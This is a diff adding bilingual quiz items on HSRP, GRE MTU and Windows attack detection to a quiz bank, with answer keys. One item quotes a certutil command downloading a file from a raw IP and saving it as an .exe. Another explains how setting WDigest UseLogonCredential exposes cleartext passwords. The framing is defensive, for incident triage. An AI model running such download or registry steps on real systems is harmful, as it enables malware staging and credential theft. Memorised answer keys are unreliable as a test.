@@ -8243,6 +8243,18 @@ window.QUIZ_BANK = {
         "correct": 0,
         "explanation": "Um erro de CRC significa que o checksum da frame não bate certo com o que chegou, ou seja, houve bits corrompidos pelo caminho. Com o duplex igual e sem colisões, as causas habituais são físicas: cabo estragado ou mal cravado, porta de patch avariada, interferência ou um transceiver a falhar. Troca o cabo ou faz um teste de cabo. Uma native VLAN diferente, o estado blocking do STP e as rejeições do port-security aparecem de outra forma e não corrompem frames.",
         "difficulty": "Médio"
+      },
+      {
+        "question": "Dois routers correm HSRP grupo 10 na VLAN 10. O 'show standby brief' mostra Active nos dois ao mesmo tempo e os utilizadores têm quebras intermitentes. O que deves verificar primeiro?",
+        "options": [
+          "Os valores de prioridade, porque dois routers com a mesma prioridade ficam sempre os dois Active até um deles ser reiniciado",
+          "O endereço MAC virtual, porque o HSRP versão 2 dá a cada router o seu próprio MAC virtual e por isso ambos aparecem Active",
+          "Se os hellos HSRP chegam de um ao outro: a VLAN 10 tem de estar ativa e permitida na ligação entre eles, sem filtro nenhum",
+          "A opção preempt, porque sem preempt nenhum dos routers abdica e os dois continuam Active depois de arrancarem os dois"
+        ],
+        "correct": 2,
+        "explanation": "Um router HSRP só fica Active quando deixa de ouvir hellos de um par melhor. Se os dois estão Active, não estão a receber os hellos um do outro, o que normalmente significa que a VLAN 10 não está no trunk entre eles, uma ligação está em baixo ou uma ACL descarta os hellos multicast. Prioridades iguais são desempatadas pelo IP mais alto, o MAC virtual é partilhado pelo grupo e o preempt só controla tomar o lugar de um Active com prioridade mais baixa.",
+        "difficulty": "Médio"
       }
     ],
     "en": [
@@ -11078,6 +11090,18 @@ window.QUIZ_BANK = {
         "correct": 0,
         "explanation": "A CRC error means the frame's checksum did not match what arrived, so bits were corrupted on the way. With duplex matching and no collisions, the usual causes are physical: bad or poorly crimped cabling, a faulty patch port, interference or a failing transceiver. Swap the cable or run a cable test. A native VLAN mismatch, an STP blocking state and port-security drops are logged differently and do not corrupt frames.",
         "difficulty": "Medium"
+      },
+      {
+        "question": "Two routers run HSRP group 10 for VLAN 10. 'show standby brief' shows Active on both of them at the same time, and users see intermittent drops. What should you check first?",
+        "options": [
+          "The priority values, because two routers with the same priority always both become Active until one of them is reloaded",
+          "The virtual MAC address, because HSRP version 2 gives each router its own virtual MAC and so both of them report Active",
+          "Whether the HSRP hellos reach each other: VLAN 10 must be up and allowed on the link between them, with no filter on it",
+          "The preempt setting, because without preempt neither router will ever step down and both stay Active after they boot"
+        ],
+        "correct": 2,
+        "explanation": "Each HSRP router becomes Active only when it stops hearing hellos from a better peer. If both are Active, they are not receiving each other's hellos, which usually means VLAN 10 is missing from the trunk between them, a link is down, or an ACL drops the multicast hellos. Equal priorities are broken by the highest IP, the virtual MAC is shared by the group, and preempt only controls taking over from a lower-priority Active router.",
+        "difficulty": "Medium"
       }
     ]
   },
@@ -13838,6 +13862,18 @@ window.QUIZ_BANK = {
         "correct": 3,
         "explanation": "Um stub EIGRP diz aos vizinhos para não o consultarem (queries), e a palavra a seguir a stub decide o que anuncia: connected, summary, static, redistributed, leak-map ou receive-only. O receive-only não anuncia nada, por isso o hub não aprende prefixos da filial, mesmo com a adjacência e o comando network corretos. A correção habitual é 'eigrp stub connected summary' (o padrão) ou pelo menos 'connected', ou uma rota estática no hub.",
         "difficulty": "Difícil"
+      },
+      {
+        "question": "Dois sites estão ligados por um túnel GRE pela internet. Os pings e o SSH pelo túnel funcionam, mas as páginas HTTPS e as cópias de ficheiros param depois dos primeiros pacotes. As ligações físicas têm MTU 1500. Qual é a correção habitual nas interfaces do túnel?",
+        "options": [
+          "Configurar 'ip mtu 1400' e 'ip tcp adjust-mss 1360', para os segmentos TCP grandes caberem com os cabeçalhos GRE e IP",
+          "Configurar 'tunnel mode ipip', porque o GRE não aguenta sessões TCP com mais de alguns pacotes e o IP-in-IP tira esse limite",
+          "Configurar 'keepalive 10 3', porque o túnel cai entre keepalives e as transferências longas são cortadas sempre que isso acontece",
+          "Configurar 'bandwidth 1500' no túnel, porque a largura de banda padrão do túnel é baixa e os fluxos grandes são limitados a zero"
+        ],
+        "correct": 0,
+        "explanation": "O GRE acrescenta 24 bytes de cabeçalhos, por isso um pacote de 1500 bytes já não cabe num caminho de 1500. Pacotes pequenos como pings e teclas de SSH passam, mas os segmentos TCP grandes com DF ligado são descartados e, se o ICMP 'fragmentation needed' estiver filtrado, o path MTU discovery falha e a sessão para. Baixar o IP MTU do túnel para 1400 e limitar o MSS do TCP a 1360 resolve. O IP-in-IP tem o mesmo problema de overhead, os keepalives só seguem o estado do túnel e o comando bandwidth só afeta métricas de routing e QoS.",
+        "difficulty": "Difícil"
       }
     ],
     "en": [
@@ -16596,6 +16632,18 @@ window.QUIZ_BANK = {
         "correct": 3,
         "explanation": "An EIGRP stub tells its neighbours not to query it, and the stub keyword decides what it advertises: connected, summary, static, redistributed, leak-map or receive-only. receive-only advertises nothing, so the hub learns no prefixes from the branch, even though the adjacency and the network statement are fine. The usual fix is 'eigrp stub connected summary' (the default) or at least 'connected', or a static route on the hub.",
         "difficulty": "Hard"
+      },
+      {
+        "question": "Two sites are joined by a GRE tunnel over the internet. Pings and SSH across the tunnel work, but HTTPS pages and file copies hang after the first few packets. The physical links have an MTU of 1500. What is the usual fix on the tunnel interfaces?",
+        "options": [
+          "Set 'ip mtu 1400' and 'ip tcp adjust-mss 1360', so large TCP segments fit with the GRE and IP headers added",
+          "Set 'tunnel mode ipip', because GRE cannot carry TCP sessions longer than a few packets and IP-in-IP removes that limit",
+          "Set 'keepalive 10 3', because the tunnel goes down between keepalives and the long transfers are cut each time it does",
+          "Set 'bandwidth 1500' on the tunnel, because the default tunnel bandwidth is too low and large flows get policed to zero"
+        ],
+        "correct": 0,
+        "explanation": "GRE adds 24 bytes of headers, so a full 1500-byte packet no longer fits on a 1500-byte path. Small packets like pings and SSH keystrokes pass, but large TCP segments with DF set are dropped, and if ICMP 'fragmentation needed' is filtered, path MTU discovery fails and the session hangs. Lowering the tunnel IP MTU to 1400 and clamping the TCP MSS to 1360 avoids it. IP-in-IP has the same overhead problem, keepalives only track tunnel state and the bandwidth command only affects routing metrics and QoS.",
+        "difficulty": "Hard"
       }
     ]
   },
@@ -18136,6 +18184,42 @@ window.QUIZ_BANK = {
         "correct": 0,
         "explanation": "No AS-REP roasting o atacante pede um TGT para contas que não precisam de pré-autenticação Kerberos; o KDC responde com dados cifrados com a chave do utilizador, que depois são quebrados offline. O DC regista o 4768 com Pre-Authentication Type 0. Encontra essas contas com PowerShell (DoesNotRequirePreAuth) e desliga a opção. O 4769 com 0x17 aponta para Kerberoasting, e o ataque não precisa de RDP nem de adivinhar passwords online.",
         "difficulty": "Médio"
+      },
+      {
+        "question": "Numa workstation encontras o evento 4698 às 03:12, criado por uma conta de utilizador que nunca entra à noite. O novo item corre o powershell.exe com um comando codificado de 15 em 15 minutos. O que é que isto mostra, muito provavelmente?",
+        "options": [
+          "Uma verificação normal do Windows Update, porque o Windows agenda as pesquisas de atualizações com PowerShell codificado à noite",
+          "Uma tentativa de logon falhada, porque o 4698 regista uma password errada e o comando codificado é o hash do que foi escrito",
+          "A mudança da password de um utilizador, porque o 4698 é escrito quando corre uma reposição e mostra o script que a alterou",
+          "Persistência através de uma nova tarefa agendada, já que o 4698 indica a criação de uma; revê o XML no evento e remove-a"
+        ],
+        "correct": 3,
+        "explanation": "O evento 4698 é registado quando uma tarefa agendada é criada (com a auditoria Other Object Access Events ligada) e inclui o XML da tarefa com a ação que corre. Uma tarefa criada de noite por uma conta invulgar que lança PowerShell codificado de poucos em poucos minutos é uma técnica clássica de persistência. As tarefas do Windows Update são tarefas de sistema assinadas, os logons falhados são o 4625 e as reposições de password o 4724.",
+        "difficulty": "Médio"
+      },
+      {
+        "question": "O EDR alerta que HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential foi posto a 1 num servidor Windows 10. Porque é que isto é um sinal de alarme sério?",
+        "options": [
+          "Ativa o NTLMv2 no servidor, que já é o padrão, por isso o alerta é um falso positivo deixado por uma baseline de segurança antiga",
+          "Desliga a proteção em tempo real do Windows Defender, para o malware poder ser copiado para o servidor sem ser analisado",
+          "Faz o LSASS guardar outra vez as passwords em texto claro após o próximo logon, e um credential dumper consegue lê-las",
+          "Obriga todos os utilizadores a mudar a password no próximo logon, o que os atacantes usam para trancar os administradores fora"
+        ],
+        "correct": 2,
+        "explanation": "Desde o Windows 8.1 e o Server 2012 R2, o WDigest deixou de guardar credenciais em texto claro no LSASS. Pôr o UseLogonCredential a 1 volta a ligar isso, por isso, depois de os utilizadores entrarem outra vez, uma ferramenta como o Mimikatz consegue extrair as passwords em texto claro. Os atacantes alteram-no para preparar o roubo de credenciais. Alerta para a mudança, repõe o 0 e procura acessos ao LSASS. Não tem nada a ver com o NTLMv2, o Defender ou mudanças forçadas de password.",
+        "difficulty": "Difícil"
+      },
+      {
+        "question": "Os registos de processos de um PC mostram: certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe. Ninguém da equipa de IT gere certificados nesse PC. Como deves interpretar isto?",
+        "options": [
+          "Uma verificação normal de revogação de certificados, porque o certutil descarrega CRLs por HTTP e grava-as como .exe em Public",
+          "Uma ferramenta do Windows usada para descarregar um ficheiro da internet, um truque living-off-the-land; isola e analisa o a.exe",
+          "Uma reparação do Windows Update, porque o certutil vai buscar ficheiros de sistema novos e guarda-os na pasta Public para instalar",
+          "Uma limpeza de cache inofensiva, porque o -urlcache apaga downloads antigos e o -split -f só divide o registo em partes mais pequenas"
+        ],
+        "correct": 1,
+        "explanation": "O certutil é um binário assinado do Windows para certificados, mas '-urlcache -split -f <url> <ficheiro>' põe-no a descarregar qualquer ficheiro. Os atacantes usam-no para trazer payloads sem precisarem de um downloader próprio, por isso é um LOLBin bem conhecido. Um .txt vindo de um IP direto e gravado como .exe em C:\\Users\\Public é um forte sinal de preparação de malware: isola o host, recolhe o ficheiro e verifica o hash. As verificações de CRL não gravam executáveis e o Windows Update não usa o certutil.",
+        "difficulty": "Médio"
       }
     ],
     "en": [
@@ -19673,6 +19757,42 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "In AS-REP roasting the attacker asks for a TGT for accounts that don't need Kerberos pre-authentication; the KDC answers with data encrypted with the user's key, which is then cracked offline. The DC logs 4768 with Pre-Authentication Type 0. Find those accounts with PowerShell (DoesNotRequirePreAuth) and clear the flag. 4769 with 0x17 points to Kerberoasting, and the attack needs neither RDP nor online password guessing.",
+        "difficulty": "Medium"
+      },
+      {
+        "question": "On a workstation you find event 4698 at 03:12, created by a user account that never logs on at night. The new item runs powershell.exe with an encoded command every 15 minutes. What does this most likely show?",
+        "options": [
+          "A routine Windows Update check, because Windows schedules its update scans with encoded PowerShell commands during the night",
+          "A failed logon attempt, because 4698 records a wrong password and the encoded command is the hash of what the user typed",
+          "A user's password being changed, because 4698 is written when a password reset runs and it lists the script that changed it",
+          "Persistence through a new scheduled task, since 4698 means a task was created; review its XML in the event and remove it"
+        ],
+        "correct": 3,
+        "explanation": "Event 4698 is logged when a scheduled task is created (with Audit Other Object Access Events on), and the event includes the task's XML with the action it runs. A task created at night by an unusual account that launches encoded PowerShell every few minutes is a classic persistence technique. Windows Update tasks are signed system tasks, failed logons are 4625 and password resets are 4724.",
+        "difficulty": "Medium"
+      },
+      {
+        "question": "Your EDR alerts that HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential was set to 1 on a Windows 10 server. Why is this a serious warning sign?",
+        "options": [
+          "It turns on NTLMv2 for the server, which is the default anyway, so the alert is a false positive left by an old security baseline",
+          "It disables Windows Defender's real-time protection, so malware can be copied to the server without being scanned on arrival",
+          "It makes LSASS keep cleartext passwords in memory again after the next logon, so a credential dumper can read them in plain text",
+          "It forces every user to change their password at the next logon, which attackers use to lock administrators out of the server"
+        ],
+        "correct": 2,
+        "explanation": "Since Windows 8.1 and Server 2012 R2, WDigest no longer keeps cleartext credentials in LSASS. Setting UseLogonCredential to 1 brings that back, so after users log on again a tool like Mimikatz can dump their passwords in plain text. Attackers set it to prepare for credential theft. Alert on the change, set it back to 0 and look for LSASS access. It has nothing to do with NTLMv2, Defender or forced password changes.",
+        "difficulty": "Hard"
+      },
+      {
+        "question": "Process logs on a PC show: certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe. Nobody on the IT team manages certificates on that PC. How should you read this?",
+        "options": [
+          "A normal certificate revocation check, because certutil downloads CRLs over HTTP and saves them as .exe files in Public",
+          "A built-in Windows tool abused to download a file from the internet, a living-off-the-land trick; check and isolate a.exe",
+          "A Windows Update repair, because certutil fetches replacement system files and stores them in the Public folder to install",
+          "A harmless cache cleanup, because -urlcache deletes old downloads and -split -f only splits the log file into smaller parts"
+        ],
+        "correct": 1,
+        "explanation": "certutil is a signed Windows binary meant for certificates, but '-urlcache -split -f <url> <file>' makes it download any file. Attackers use it to pull payloads without bringing their own downloader, which is why it is a well-known LOLBin. A .txt from a raw IP saved as an .exe in C:\\Users\\Public is a strong sign of malware staging, so isolate the host, collect the file and check its hash. CRL checks don't write executables, and Windows Update doesn't use certutil.",
         "difficulty": "Medium"
       }
     ]
